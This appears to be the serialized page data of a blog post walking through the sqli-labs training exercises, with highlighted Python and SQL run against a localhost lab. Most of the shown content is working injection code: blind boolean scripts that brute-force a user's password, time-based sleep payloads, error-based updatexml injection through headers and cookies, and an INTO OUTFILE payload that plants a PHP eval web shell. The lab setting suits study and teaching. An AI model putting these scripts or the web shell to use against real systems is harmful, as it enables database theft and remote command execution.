2:I[55329,["481","static/chunks/457b8330-b5c9cf3fcf214847.js","954","static/chunks/d3ac728e-0c798b3b8aa3bf53.js","612","static/chunks/612-fa632c1349770315.js","120","static/chunks/120-aab2c7424ca78adb.js","842","static/chunks/842-d74718c5f90093f4.js","318","static/chunks/app/(posts)/%5B...slug%5D/page-3a16860145cf3a64.js"],""]
3:I[76842,["481","static/chunks/457b8330-b5c9cf3fcf214847.js","954","static/chunks/d3ac728e-0c798b3b8aa3bf53.js","612","static/chunks/612-fa632c1349770315.js","120","static/chunks/120-aab2c7424ca78adb.js","842","static/chunks/842-d74718c5f90093f4.js","318","static/chunks/app/(posts)/%5B...slug%5D/page-3a16860145cf3a64.js"],"PostMeta"]
4:"$Sreact.suspense"
6:I[76842,["481","static/chunks/457b8330-b5c9cf3fcf214847.js","954","static/chunks/d3ac728e-0c798b3b8aa3bf53.js","612","static/chunks/612-fa632c1349770315.js","120","static/chunks/120-aab2c7424ca78adb.js","842","static/chunks/842-d74718c5f90093f4.js","318","static/chunks/app/(posts)/%5B...slug%5D/page-3a16860145cf3a64.js"],"LikeButton"]
7:I[5613,[],""]
9:I[31778,[],""]
a:I[89806,["250","static/chunks/250-0ef8476c0fa8ee24.js","372","static/chunks/372-d691a55303c8d24a.js","993","static/chunks/app/(posts)/layout-e15e5287e741ad91.js"],""]
b:I[25694,["250","static/chunks/250-0ef8476c0fa8ee24.js","185","static/chunks/app/layout-9af8316721e2155d.js"],"GlobalProvider"]
c:I[30397,["250","static/chunks/250-0ef8476c0fa8ee24.js","185","static/chunks/app/layout-9af8316721e2155d.js"],""]
8:["slug","25d/sqli-labs","c"]
0:["OrzFtc2lW-qebB0Yo1UFi",[[["",{"children":["(posts)",{"children":[["slug","25d/sqli-labs","c"],{"children":["__PAGE__?{\"slug\":[\"25d\",\"sqli-labs\"]}",{}]}]}]},"$undefined","$undefined",true],["",{"children":["(posts)",{"children":[["slug","25d/sqli-labs","c"],{"children":["__PAGE__",{},["$L1",[["$","$L2",null,{}],false,["$","h1",null,{"className":"x-post-title","children":"SQLi Labs"}],["$","$L3",null,{"path":"/25d/sqli-labs/"}],["$","$4",null,{"fallback":["$","p",null,{"children":"Loading component..."}],"children":"$L5"}],["$","$L6",null,{"path":"/25d/sqli-labs/"}]],null]]},["$","$L7",null,{"parallelRouterKey":"children","segmentPath":["children","(posts)","children","$8","children"],"loading":"$undefined","loadingStyles":"$undefined","loadingScripts":"$undefined","hasLoading":false,"error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L9",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","notFoundStyles":"$undefined","styles":[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/240ac071240631e8.css","precedence":"next","crossOrigin":""}]]}]]},[null,["$","div",null,{"id":"post-layout","children":[["$","div",null,{"id":"main","className":"center-wrapper","children":["$","$L7",null,{"parallelRouterKey":"children","segmentPath":["children","(posts)","children"],"loading":"$undefined","loadingStyles":"$undefined","loadingScripts":"$undefined","hasLoading":false,"error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L9",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","notFoundStyles":"$undefined","styles":null}]}],["$","$La",null,{}]]}],null]]},[null,["$","html",null,{"lang":"zh-CN","suppressHydrationWarning":true,"children":[["$","head",null,{"children":[["$","link",null,{"rel":"icon","href":"/favicon.ico","type":"image/x-icon"}],["$","script",null,{"async":true,"src":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"}],["$","script",null,{"async":true,"src":"https://www.googletagmanager.com/gtag/js?id=G-45BYSZ6WPY"}],["$","script",null,{"dangerouslySetInnerHTML":{"__html":"\nwindow.dataLayer = window.dataLayer || [];\nfunction gtag() {\n    dataLayer.push(arguments);\n}\ngtag('js', new Date());\ngtag('config', 'G-45BYSZ6WPY');\n"}}],["$","script",null,{"dangerouslySetInnerHTML":{"__html":"\nconst currentTheme = localStorage.getItem('theme');\nif (currentTheme !== 'light' && currentTheme !== 'dark') {\n    localStorage.setItem('theme', 'light');\n}\nif (localStorage.getItem('theme') === 'dark') {\n    document.documentElement.setAttribute('class', 'dark');\n} else {\n    document.documentElement.setAttribute('class', 'light');\n}\n"}}],["$","script",null,{"dangerouslySetInnerHTML":{"__html":"\nif (!Array.prototype.findLast) {\n    Array.prototype.findLast = function (callback) {\n        for (let i = this.length - 1; i >= 0; i--) {\n            if (callback(this[i])) return this[i];\n        }\n        return undefined;\n    };\n}\nif (!Array.prototype.findLastIndex) {\n    Array.prototype.findLastIndex = function (callback) {\n        for (let i = this.length - 1; i >= 0; i--) {\n            if (callback(this[i])) return i;\n        }\n        return -1;\n    };\n}\n"}}]]}],["$","body",null,{"children":["$","$Lb",null,{"children":[["$","$Lc",null,{}],["$","$L7",null,{"parallelRouterKey":"children","segmentPath":["children"],"loading":"$undefined","loadingStyles":"$undefined","loadingScripts":"$undefined","hasLoading":false,"error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L9",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":["$","div",null,{"id":"notfound","children":[["$","img",null,{"alt":"img","src":"/images/cry.gif"}],["$","code",null,{"id":"notfound-404","children":"404"}],["$","code",null,{"id":"notfound-text","children":"Page Not Found"}]]}],"notFoundStyles":[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/98e601cf5ba3633d.css","precedence":"next","crossOrigin":""}]],"styles":[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/3bc7e8f21884ab46.css","precedence":"next","crossOrigin":""}]]}]]}]}]]}],null]],[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/17b3c4485edf7c41.css","precedence":"next","crossOrigin":""}]],"$Ld"]]]]
e:I[62029,["481","static/chunks/457b8330-b5c9cf3fcf214847.js","954","static/chunks/d3ac728e-0c798b3b8aa3bf53.js","612","static/chunks/612-fa632c1349770315.js","120","static/chunks/120-aab2c7424ca78adb.js","842","static/chunks/842-d74718c5f90093f4.js","318","static/chunks/app/(posts)/%5B...slug%5D/page-3a16860145cf3a64.js"],""]
10:I[74365,["481","static/chunks/457b8330-b5c9cf3fcf214847.js","954","static/chunks/d3ac728e-0c798b3b8aa3bf53.js","612","static/chunks/612-fa632c1349770315.js","120","static/chunks/120-aab2c7424ca78adb.js","842","static/chunks/842-d74718c5f90093f4.js","318","static/chunks/app/(posts)/%5B...slug%5D/page-3a16860145cf3a64.js"],""]
f:T8e9,<span class="token keyword">import</span> requests

base_url <span class="token operator">=</span> <span class="token string">"http://localhost/sqli-labs/"</span>


<span class="token keyword">def</span> <span class="token function">query_get</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> base_url <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>path<span class="token punctuation">}</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">{</span>payload<span class="token punctuation">}</span></span><span class="token string">"</span></span>
    resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
    <span class="token keyword">return</span> resp


<span class="token keyword">def</span> <span class="token function">query_post</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> base_url <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>path<span class="token punctuation">}</span></span><span class="token string">/"</span></span>
    resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
    <span class="token keyword">return</span> resp
11:T48a,<span class="token keyword">SELECT</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"Yes"</span><span class="token punctuation">,</span><span class="token string">"No"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">-- Yes</span>
<span class="token keyword">SELECT</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token operator">></span><span class="token number">45</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">-- 4</span>
12:T11f8,<span class="token keyword">from</span> query <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token comment"># target: SELECT password FROM security.users WHERE username='Angelina'</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>query_get<span class="token punctuation">(</span><span class="token string">"Less-5"</span><span class="token punctuation">,</span> <span class="token string">"?id=1' AND 1=0 -- "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 720</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>query_get<span class="token punctuation">(</span><span class="token string">"Less-5"</span><span class="token punctuation">,</span> <span class="token string">"?id=1' AND 1=1 -- "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 704</span>


<span class="token keyword">def</span> <span class="token function">brute_force</span><span class="token punctuation">(</span>pos<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"?id=1' AND ascii(substr((SELECT password FROM security.users WHERE username='Angelina'),</span><span class="token interpolation"><span class="token punctuation">{</span>pos<span class="token punctuation">}</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string"> -- "</span></span>
        resp <span class="token operator">=</span> query_get<span class="token punctuation">(</span><span class="token string">"Less-5"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">704</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> i
    <span class="token keyword">return</span> <span class="token boolean">None</span>


password <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    ch <span class="token operator">=</span> brute_force<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> ch <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] found"</span><span class="token punctuation">,</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span><span class="token punctuation">)</span>
    password <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span>  <span class="token comment"># I-kill-you</span>
13:Tb6e,<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>query_get<span class="token punctuation">(</span><span class="token string">"Less-6"</span><span class="token punctuation">,</span> <span class="token string">'?id=1" AND 1=0 -- '</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 720</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>query_get<span class="token punctuation">(</span><span class="token string">"Less-6"</span><span class="token punctuation">,</span> <span class="token string">'?id=1" AND 1=1 -- '</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 702</span>


<span class="token keyword">def</span> <span class="token function">brute_force</span><span class="token punctuation">(</span>pos<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'?id=1" AND ascii(substr((SELECT password FROM security.users WHERE username="Angelina"),</span><span class="token interpolation"><span class="token punctuation">{</span>pos<span class="token punctuation">}</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string"> -- '</span></span>
        resp <span class="token operator">=</span> query_get<span class="token punctuation">(</span><span class="token string">"Less-6"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">702</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> i
    <span class="token keyword">return</span> <span class="token boolean">None</span>
14:Tbe7,<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>font</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>#FFFF00<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>You have an error in your SQL syntax<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>font</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>font</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>font</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>#FFFF00<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>You are in.... Use outfile......<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>font</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>font</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span>
15:Tac7,<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"You are in"</span> <span class="token keyword">in</span> query_get<span class="token punctuation">(</span><span class="token string">"Less-7"</span><span class="token punctuation">,</span> <span class="token string">"?id=1')) AND 1=0 -- "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span>  <span class="token comment"># False</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"You are in"</span> <span class="token keyword">in</span> query_get<span class="token punctuation">(</span><span class="token string">"Less-7"</span><span class="token punctuation">,</span> <span class="token string">"?id=1')) AND 1=1 -- "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span>  <span class="token comment"># True</span>


<span class="token keyword">def</span> <span class="token function">brute_force</span><span class="token punctuation">(</span>pos<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"?id=1')) AND ascii(substr((SELECT password FROM security.users WHERE username='Angelina'),</span><span class="token interpolation"><span class="token punctuation">{</span>pos<span class="token punctuation">}</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string"> -- "</span></span>
        resp <span class="token operator">=</span> query_get<span class="token punctuation">(</span><span class="token string">"Less-7"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">"You are in"</span> <span class="token keyword">in</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            <span class="token keyword">return</span> i
    <span class="token keyword">return</span> <span class="token boolean">None</span>
16:Tb6e,<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>query_get<span class="token punctuation">(</span><span class="token string">"Less-8"</span><span class="token punctuation">,</span> <span class="token string">"?id=1' AND 1=0 -- "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 722</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>query_get<span class="token punctuation">(</span><span class="token string">"Less-8"</span><span class="token punctuation">,</span> <span class="token string">"?id=1' AND 1=1 -- "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 706</span>


<span class="token keyword">def</span> <span class="token function">brute_force</span><span class="token punctuation">(</span>pos<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"?id=1' AND ascii(substr((SELECT password FROM security.users WHERE username='Angelina'),</span><span class="token interpolation"><span class="token punctuation">{</span>pos<span class="token punctuation">}</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string"> -- "</span></span>
        resp <span class="token operator">=</span> query_get<span class="token punctuation">(</span><span class="token string">"Less-8"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">706</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> i
    <span class="token keyword">return</span> <span class="token boolean">None</span>
17:Tb6e,<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>query_get<span class="token punctuation">(</span><span class="token string">"Less-9"</span><span class="token punctuation">,</span> <span class="token string">"?id=1' AND 1=0 -- "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 744</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>query_get<span class="token punctuation">(</span><span class="token string">"Less-9"</span><span class="token punctuation">,</span> <span class="token string">"?id=1' AND 1=1 -- "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 707</span>


<span class="token keyword">def</span> <span class="token function">brute_force</span><span class="token punctuation">(</span>pos<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"?id=1' AND ascii(substr((SELECT password FROM security.users WHERE username='Angelina'),</span><span class="token interpolation"><span class="token punctuation">{</span>pos<span class="token punctuation">}</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string"> -- "</span></span>
        resp <span class="token operator">=</span> query_get<span class="token punctuation">(</span><span class="token string">"Less-9"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">707</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> i
    <span class="token keyword">return</span> <span class="token boolean">None</span>
18:Tb71,<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>query_get<span class="token punctuation">(</span><span class="token string">"Less-10"</span><span class="token punctuation">,</span> <span class="token string">'?id=1" AND 1=0 -- '</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 746</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>query_get<span class="token punctuation">(</span><span class="token string">"Less-10"</span><span class="token punctuation">,</span> <span class="token string">'?id=1" AND 1=1 -- '</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 709</span>


<span class="token keyword">def</span> <span class="token function">brute_force</span><span class="token punctuation">(</span>pos<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'?id=1" AND ascii(substr((SELECT password FROM security.users WHERE username="Angelina"),</span><span class="token interpolation"><span class="token punctuation">{</span>pos<span class="token punctuation">}</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string"> -- '</span></span>
        resp <span class="token operator">=</span> query_get<span class="token punctuation">(</span><span class="token string">"Less-10"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">709</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> i
    <span class="token keyword">return</span> <span class="token boolean">None</span>
19:T6d9,root <span class="token operator">=</span> <span class="token string">r"C:\\path\\to\\WWW\\sqli-labs\\Less-7\\"</span>

shell <span class="token operator">=</span> <span class="token string">'&lt;?php @eval($_GET["cmd"]); ?>'</span>
shell_hex <span class="token operator">=</span> <span class="token string">"0x"</span> <span class="token operator">+</span> shell<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
shell_path <span class="token operator">=</span> root <span class="token operator">+</span> <span class="token string">"shell.php"</span>

payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"?id=x')) UNION SELECT '','',</span><span class="token interpolation"><span class="token punctuation">{</span>shell_hex<span class="token punctuation">}</span></span><span class="token string"> INTO OUTFILE '</span><span class="token interpolation"><span class="token punctuation">{</span>shell_path<span class="token punctuation">}</span></span><span class="token string">' -- "</span></span>
<span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
<span class="token comment"># ?id=x')) UNION SELECT '','',0x3c3f70687020406576616c28245f4745545b22636d64225d293b203f3e INTO OUTFILE '...' --</span>

query_get<span class="token punctuation">(</span><span class="token string">"Less-7"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
1a:Tc68,<span class="token keyword">from</span> query <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> requests

payloads <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">'x"   OR sleep(10) -- '</span><span class="token punctuation">,</span>
    <span class="token string">'x")  OR sleep(10) -- '</span><span class="token punctuation">,</span>
    <span class="token string">'x")) OR sleep(10) -- '</span><span class="token punctuation">,</span>
    <span class="token string">"x'   OR sleep(10) -- "</span><span class="token punctuation">,</span>
    <span class="token string">"x')  OR sleep(10) -- "</span><span class="token punctuation">,</span>
    <span class="token string">"x')) OR sleep(10) -- "</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span>

<span class="token keyword">for</span> payload <span class="token keyword">in</span> payloads<span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        query_post<span class="token punctuation">(</span><span class="token string">"Less-15"</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"uname"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span> <span class="token string">"passwd"</span><span class="token punctuation">:</span> <span class="token string">"x"</span><span class="token punctuation">}</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>Timeout<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Vulnerable payload:"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
<span class="token comment"># [*] Vulnerable payload: x'   OR sleep(10) --</span>

payload <span class="token operator">=</span> <span class="token string">"x' OR 1=1 -- "</span>
resp <span class="token operator">=</span> query_post<span class="token punctuation">(</span><span class="token string">"Less-15"</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"uname"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span> <span class="token string">"passwd"</span><span class="token punctuation">:</span> <span class="token string">"x"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
1b:T40c,payload <span class="token operator">=</span> <span class="token string">"x', 0, updatexml(null,concat(0x7e,(SELECT version()),0x7e),null)) #"</span>
resp <span class="token operator">=</span> query_post<span class="token punctuation">(</span><span class="token string">"Less-18"</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"uname"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span> <span class="token string">"passwd"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">}</span><span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"User-Agent"</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span><span class="token punctuation">)</span>
1c:T406,payload <span class="token operator">=</span> <span class="token string">"x', updatexml(null,concat(0x7e,(SELECT version()),0x7e),null)) #"</span>
resp <span class="token operator">=</span> query_post<span class="token punctuation">(</span><span class="token string">"Less-19"</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"uname"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span> <span class="token string">"passwd"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">}</span><span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"Referer"</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span><span class="token punctuation">)</span>
1d:T405,payload <span class="token operator">=</span> <span class="token string">"x' OR updatexml(null,concat(0x7e,(SELECT version()),0x7e),null) #"</span>
resp <span class="token operator">=</span> query_post<span class="token punctuation">(</span><span class="token string">"Less-20"</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"uname"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span> <span class="token string">"passwd"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">}</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"uname"</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span><span class="token punctuation">)</span>
1e:T5bf,payload <span class="token operator">=</span> <span class="token string">"x') OR updatexml(null,concat(0x7e,(SELECT version()),0x7e),null) #"</span>
